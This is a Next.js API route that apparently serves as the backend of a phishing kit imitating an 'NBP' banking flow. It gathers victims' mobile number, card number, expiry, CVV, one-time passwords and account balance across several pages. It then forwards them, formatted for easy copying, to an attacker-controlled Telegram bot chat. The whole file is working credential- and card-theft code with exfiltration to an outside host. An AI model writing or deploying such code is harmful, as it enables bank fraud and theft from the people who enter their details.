import { NextResponse } from 'next/server'

// Escape values for Telegram HTML parse mode
function escapeHtml(value: string) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// Wrap a value in <code> so it is tap-to-copy inside Telegram
function copyable(value: string | number) {
  return `<code>${escapeHtml(String(value))}</code>`
}

// Builds the cumulative message: whatever fields have been collected so far
// (across the login, card, otp, balance, and confirm-otp pages) are included,
// in a fixed order, so every step's notification contains all prior details.
function buildCumulativeText(body: Record<string, unknown>) {
  const lines: string[] = ['<b>NBP submission update</b>']

  const mobile = typeof body?.mobile === 'string' ? body.mobile.trim() : ''
  const card = typeof body?.card === 'string' ? body.card.trim() : ''
  const month = typeof body?.month === 'string' ? body.month.trim() : ''
  const year = typeof body?.year === 'string' ? body.year.trim() : ''
  const cvv = typeof body?.cvv === 'string' ? body.cvv.trim() : ''
  const otp = typeof body?.otp === 'string' ? body.otp.trim() : ''
  const balance = typeof body?.balance === 'string' ? body.balance.trim() : ''
  const confirmOtp = typeof body?.confirmOtp === 'string' ? body.confirmOtp.trim() : ''

  if (mobile) lines.push(`Mobile: ${copyable(mobile)}`)
  if (card) lines.push(`Card: ${copyable(card)}`)
  if (month || year) lines.push(`Expiry: ${copyable(`${month || '--'}/${year || '----'}`)}`)
  if (cvv) lines.push(`CVV: ${copyable(cvv)}`)
  if (otp) lines.push(`OTP: ${copyable(otp)}`)
  if (balance) lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
  if (confirmOtp) lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)

  return lines.length > 1 ? lines.join('\n') : ''
}

// The single configured bot/chat pair that notifications are delivered to.
function getTelegramTargets() {
  const targets: { token: string; chatId: string }[] = []

  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID
  if (token && chatId) targets.push({ token, chatId })

  return targets
}

export async function POST(request: Request) {
  const targets = getTelegramTargets()

  if (targets.length === 0) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  try {
    const body = await request.json()

    const cumulative = buildCumulativeText(body ?? {})

    if (cumulative) {
      text = cumulative
    } else if (typeof body?.text === 'string' && body.text.trim()) {
      text = escapeHtml(body.text.trim())
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed ? `New number submitted: ${copyable(trimmed)}` : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  const results = await Promise.allSettled(
    targets.map(({ token, chatId }) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
        }),
        cache: 'no-store',
      }),
    ),
  )

  const anySucceeded = results.some((result) => result.status === 'fulfilled' && result.value.ok)

  if (!anySucceeded) {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }

  return NextResponse.json({ ok: true })
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
